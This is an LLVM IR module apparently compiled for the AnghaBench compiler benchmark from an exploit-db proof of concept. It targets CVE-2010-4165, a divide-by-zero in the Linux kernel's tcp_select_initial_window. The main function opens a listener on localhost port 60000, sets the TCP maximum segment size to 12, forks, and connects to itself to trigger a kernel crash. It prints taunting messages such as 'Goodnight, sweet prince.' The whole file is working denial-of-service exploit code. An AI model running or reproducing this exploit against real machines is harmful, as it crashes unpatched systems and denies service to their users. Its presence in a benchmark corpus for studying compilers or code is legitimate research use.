; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_16263.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_16263.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8*, %struct.TYPE_2__, i8* }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@.str.1 = private unnamed_addr constant [58 x i8] c"[ Linux Kernel tcp_select_initial_window divide by 0 DoS\0A\00", align 1
@AF_INET = common dso_local global i8* null, align 8
@SOCK_STREAM = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"[ Cannot bind listener service\0A\00", align 1
@IPPROTO_TCP = common dso_local global i32 0, align 4
@TCP_MAXSEG = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [74 x i8] c"[ System is not patched against CVE-2010-4165\0A[ Goodnight, sweet prince.\0A\00", align 1
@.str.5 = private unnamed_addr constant [48 x i8] c"[ System is patched, no dreams for this prince\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca %struct.sockaddr_in, align 8
  %10 = alloca %struct.sockaddr_in, align 8
  %11 = alloca %struct.sockaddr_in, align 8
  %12 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8** %8, align 8
  %13 = call i32 @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.1, i64 0, i64 0))
  %14 = load i8*, i8** @AF_INET, align 8
  %15 = load i32, i32* @SOCK_STREAM, align 4
  %16 = call i32 @socket(i8* %14, i32 %15, i32 0)
  store i32 %16, i32* %5, align 4
  %17 = call i32 @memset(%struct.sockaddr_in* %10, i32 0, i32 24)
  %18 = call i32 @memset(%struct.sockaddr_in* %11, i32 0, i32 24)
  %19 = load i8*, i8** @AF_INET, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i8* %19, i8** %20, align 8
  %21 = call i8* @htons(i32 60000)
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i8* %21, i8** %22, align 8
  %23 = load i32, i32* @INADDR_ANY, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  %25 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %24, i32 0, i32 0
  store i32 %23, i32* %25, align 8
  %26 = load i8*, i8** @AF_INET, align 8
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i8* %26, i8** %27, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %29 = call i32 @inet_aton(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), %struct.TYPE_2__* %28)
  %30 = call i8* @htons(i32 60000)
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i8* %30, i8** %31, align 8
  %32 = load i32, i32* %5, align 4
  %33 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %34 = call i32 @bind(i32 %32, %struct.sockaddr* %33, i32 4)
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %39

36:                                               ; preds = %0
  %37 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %38 = call i32 @exit(i32 -1) #3
  unreachable

39:                                               ; preds = %0
  %40 = load i32, i32* %5, align 4
  %41 = call i32 @listen(i32 %40, i32 4)
  store i32 12, i32* %2, align 4
  %42 = load i32, i32* %5, align 4
  %43 = load i32, i32* @IPPROTO_TCP, align 4
  %44 = load i32, i32* @TCP_MAXSEG, align 4
  %45 = call i32 @setsockopt(i32 %42, i32 %43, i32 %44, i32* %2, i32 4)
  store i32 %45, i32* %4, align 4
  %46 = load i32, i32* %4, align 4
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %48, label %65

48:                                               ; preds = %39
  %49 = call i32 @printf(i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.4, i64 0, i64 0))
  store i32 24, i32* %12, align 4
  %50 = call i32 (...) @fork()
  store i32 %50, i32* %7, align 4
  switch i32 %50, label %56 [
    i32 0, label %51
  ]

51:                                               ; preds = %48
  %52 = load i32, i32* %5, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @accept(i32 %52, %struct.sockaddr* %53, i32* %12)
  store i32 %54, i32* %5, align 4
  %55 = call i32 @sleep(i32 3)
  br label %56

56:                                               ; preds = %48, %51
  %57 = load i8*, i8** @AF_INET, align 8
  %58 = load i32, i32* @SOCK_STREAM, align 4
  %59 = call i32 @socket(i8* %57, i32 %58, i32 0)
  store i32 %59, i32* %6, align 4
  %60 = load i32, i32* %6, align 4
  %61 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %62 = call i32 @connect(i32 %60, %struct.sockaddr* %61, i32 24)
  %63 = call i32 @sleep(i32 3)
  br label %64

64:                                               ; preds = %56
  br label %65

65:                                               ; preds = %64, %39
  %66 = call i32 @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.5, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @socket(i8*, i32, i32) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @inet_aton(i8*, %struct.TYPE_2__*) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
